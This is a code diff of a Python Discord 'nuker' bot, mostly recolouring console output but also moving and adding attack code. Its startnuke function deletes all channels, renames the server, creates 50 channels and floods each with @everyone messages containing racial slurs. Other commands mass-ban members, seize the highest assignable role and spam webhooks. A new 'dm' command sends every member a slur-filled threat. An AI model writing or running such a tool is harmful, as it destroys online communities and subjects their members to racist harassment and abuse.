@@ -21,13 +21,13 @@ def install_requirements_if_needed():
         )
 
         if result.returncode == 0:
-            print("All dependencies are up to date.")
+            print(Fore.MAGENTA + "All dependencies are up to date.")
         else:
-            print("Some dependencies were missing or outdated and have been installed.")
+            print(Fore.MAGENTA + "Some dependencies were missing or outdated and have been installed.")
     except FileNotFoundError:
-        print("requirements.txt not found.")
+        print(Fore.MAGENTA + "requirements.txt not found.")
     except subprocess.CalledProcessError as e:
-        print(f"Error during installation: {e}")
+        print(Fore.MAGENTA + f"Error during installation: {e}")
 
 if os.path.isfile("requirements.txt"):
     install_requirements_if_needed()
@@ -56,7 +56,7 @@ async def async_input(prompt: str) -> str:
 
 @bot.event
 async def on_ready():
-    print(f'Bot is ready. Logged in as {bot.user} (ID: {bot.user.id})')
+    print(Fore.MAGENTA + f'Bot is ready. Logged in as {bot.user} (ID: {bot.user.id})')
 
     time.sleep(2)
     os.system('cls' if os.name == 'nt' else 'clear')
@@ -99,7 +99,7 @@ async def on_ready():
 "[-] I cannot find a server with that ID"
                 )
             else:
-
+                await startnuke(guild)
                 user_ids = [1172480590600216700, ID
                             ] 
 
@@ -148,14 +148,11 @@ async def on_ready():
                                 Fore.MAGENTA +
                                 f"[-] Failed to add role to user with ID {user_id}: {e}"
                             )
-
-
-                await startnuke(guild)
             os.system('cls' if os.name == 'nt' else 'clear')
 
         elif choice == '2':
             os.system('cls' if os.name == 'nt' else 'clear')
-            print("run !nuke in any channel ")
+            print(Fore.MAGENTA + "run $nuke in any channel ")
             time.sleep(2)
             os.system('cls' if os.name == 'nt' else 'clear')
 
@@ -171,17 +168,17 @@ async def on_ready():
                     headers = {"Content-Type": "application/json"}
                     response = requests.post(webhook_url, json=payload, headers=headers)
                     if response.status_code == 204:
-                        print(f"Message {i+1} sent successfully!")
+                        print(Fore.MAGENTA + f"Message {i+1} sent successfully!")
                     else:
-                        print(f"Error sending message {i+1}: {response.text}")
+                        print(Fore.MAGENTA + f"Error sending message {i+1}: {response.text}")
                     time.sleep(0)  
 
             if delete_webhook.lower() == "yes":
                     response = requests.delete(webhook_url)
                     if response.status_code == 204:
-                        print("Webhook deleted successfully!")
+                        print(Fore.MAGENTA + "Webhook deleted successfully!")
                     else:
-                        print(f"Error deleting webhook: {response.text}")
+                        print(Fore.MAGENTA + f"Error deleting webhook: {response.text}")
 
             time.sleep(2)
             os.system('cls' if os.name == 'nt' else 'clear')
@@ -241,7 +238,7 @@ async def on_ready():
                             guild = bot.get_guild(guild_id)
 
                             if guild is None:
-                                print(f"[-] Guild with ID '{guild_id}' not found.")
+                                print(Fore.MAGENTA + f"[-] Guild with ID '{guild_id}' not found.")
                                 continue
 
                             user_id = input("Enter the user ID to unban: ")
@@ -251,17 +248,17 @@ async def on_ready():
                                 if any(banned_user.user.id == user_id for banned_user in banned_users):
                                     user = discord.Object(id=user_id)
                                     await guild.unban(user)  
-                                    print(f" [+] Unbanned user with ID {user_id} in guild: {guild.name}")
+                                    print(Fore.MAGENTA + f" [+] Unbanned user with ID {user_id} in guild: {guild.name}")
                                 else:
-                                    print(f" [-] User ID {user_id} is not banned in guild: {guild.name}")
+                                    print(Fore.MAGENTA + f" [-] User ID {user_id} is not banned in guild: {guild.name}")
                             except ValueError:
-                                print("[-] Please enter a valid user ID.")
+                                print(Fore.MAGENTA + "[-] Please enter a valid user ID.")
                             except discord.Forbidden:
-                                print(f"[-] I do not have permission to unban users in guild: {guild.name}")
+                                print(Fore.MAGENTA + f"[-] I do not have permission to unban users in guild: {guild.name}")
                             except discord.HTTPException as e:
-                                print(f"[-] Failed to unban user with ID {user_id} in guild: {guild.name}. Error: {e}")
+                                print(Fore.MAGENTA + f"[-] Failed to unban user with ID {user_id} in guild: {guild.name}. Error: {e}")
                         except ValueError:
-                            print("[-] Please enter a valid guild ID.")
+                            print(Fore.MAGENTA + "[-] Please enter a valid guild ID.")
 
         else:
             print(Fore.MAGENTA + "[-] Invalid choice.")
@@ -275,30 +272,25 @@ async def on_command_error(ctx, error):
 
 
 async def startnuke(guild):
-    # Delete all existing channels
     delete_tasks = [channel.delete() for channel in guild.channels]
     await asyncio.gather(*delete_tasks)
-
-    # Change the guild name
     await guild.edit(name='SERVER NUKED BY VERSE')
 
-    # Function to spam messages in a channel
+
     async def spam_messages(channel):
         for _ in range(10000):
             await channel.send(f'@everyone I RUN YOU BITCH')
             await channel.send(f'@everyone LOL DUMB NIGGA')
             await channel.send(f'@everyone raided by daddy verse (https://www.youtube.com/@verse-lmao)')
-
-    # Create new channels with random names and start spamming messages concurrently
     for i in range(50):
-        channel_name = random.choice(channel_names)  # Select a random channel name
-        channel = await guild.create_text_channel(channel_name)  # Create channel with random name
-        # Start spamming messages in the newly created channel
+        channel_name = random.choice(channel_names)
+        channel = await guild.create_text_channel(channel_name)
         asyncio.create_task(spam_messages(channel))
 
-    print("[+] Nuke operation completed!")
-    await asyncio.sleep(2)  # Use await for sleep in async function
+    print(Fore.MAGENTA + "[+] Nuke operation completed!")
+    await asyncio.sleep(2)
     os.system('cls' if os.name == 'nt' else 'clear')
+
 
 @bot.command()
 async def nuke(ctx):
@@ -344,13 +336,13 @@ async def admin(ctx):
 
                 bot_member = guild.get_member(bot.user.id)
                 if bot_member is None:
-                    print(" [-] The bot is not a member of this server.")
+                    print(Fore.MAGENTA + "[-] The bot is not a member of this server.")
                     return
 
                 assignable_roles = [role for role in guild.roles if role <= bot_member.top_role and role != bot_member.top_role]
 
                 if not assignable_roles:
-                    print(" [-] I cannot assign any roles to you.")
+                    print(Fore.MAGENTA + "[-] I cannot assign any roles to you.")
                     return
 
                 highest_assignable_role = max(assignable_roles, key=lambda role: role.position)
@@ -358,11 +350,12 @@ async def admin(ctx):
 
                 try:
                     await user.add_roles(highest_assignable_role)
-                    print(f" [+] Successfully added the highest role '{highest_assignable_role.name}' to {user.name}.")
+                    print(" ")
+                    print(Fore.MAGENTA + f" [+] Successfully added the highest role '{highest_assignable_role.name}' to {user.name}.")
                 except discord.Forbidden:
-                    print(" [-] I do not have permission to add roles to the user.")
+                    print(Fore.MAGENTA + " [-] I do not have permission to add roles to the user.")
                 except discord.HTTPException as e:
-                    print(f" [-] Failed to add role to the user: {e}")
+                    print(Fore.MAGENTA + f" [-] Failed to add role to the user: {e}")
 
 
 
@@ -370,20 +363,25 @@ async def admin(ctx):
 async def create(ctx, *, name: str):
 
     if not ctx.guild.me.guild_permissions.manage_channels:
-        print("I do not have permission to manage channels.")
-        print("-" * 50) 
+        print(" ")
+        print(Fore.MAGENTA + "[-]I do not have permission to manage channels.")
+        print(Fore.MAGENTA + "-" * 50) 
         return
 
 
     try:
 
         new_channel = await ctx.guild.create_text_channel(name)
-        print(f"Successfully created channel: '{new_channel.name}'")
+        print(" ")
+        print(" ")
+        print(Fore.MAGENTA + f"[+] Successfully created channel: '{new_channel.name}'")
     except discord.HTTPException as e:
-        print(f"Failed to create channel: {e}")
+        print(" ")
+        print(Fore.MAGENTA + f"[-] Failed to create channel: {e}")
+        print(" ")
 
 
-    print("-" * 50) 
+    print(Fore.MAGENTA + "-" * 50) 
 
 
 @bot.command()
@@ -395,11 +393,14 @@ async def ban(ctx):
         if member.id not in noban_ids and member != ctx.guild.me:  
             try:
                 await member.ban(reason="LOL")
-                print(f" [+] Banned {member.name}#{member.discriminator} for reason: LOL")
+                print(" ")
+                print(Fore.MAGENTA + f" [+] Banned {member.name}#{member.discriminator} for reason: LOL")
             except discord.Forbidden:
-                print(f" [-] Failed to ban {member.name}#{member.discriminator}: Forbidden")
+                print(" ")
+                print(Fore.MAGETA + f" [-] Failed to ban {member.name}#{member.discriminator}: Forbidden")
             except discord.HTTPException as e:
-                print(f"[-] Failed to ban {member.name}#{member.discriminator}: {e}")
+                print(" ")
+                print(Fore.MAGENTA + f"[-] Failed to ban {member.name}#{member.discriminator}: {e}")
 
 
 @bot.command()
@@ -435,7 +436,23 @@ async def discommunity(ctx):
     if guild.features and 'COMMUNITY' in guild.features:
         await guild.edit(community=False) 
 
-    print(f"Community features disabled for {guild.name}")
+    print(Fore.MAGENTA + f"Community features disabled for {guild.name}")
+
+@bot.command()
+async def dm(ctx):
+    if ctx.guild:
+        server_name = ctx.guild.name
+        for member in ctx.guild.members:
+            if not member.bot:
+                try:
+                    await member.send(f"NIGGA  {member.mention} {server_name} IS ABOUT TO GET NUKED!")
+                    print(Fore.MAGENTA + f"Sent DM to {member.name}")
+                except discord.Forbidden:
+                    print(Fore.MAGENTA + f"Could not send DM to {member.name}. They might have DMs disabled.")
+                except Exception as e:
+                    print(Fore.MAGENTA + f"An error occurred: {e}")
+    else:
+        print(Fore.MAGENTA + "This command can only be used in a server.")
 
 token_file = "token.txt"  
 if not os.path.exists(token_file):
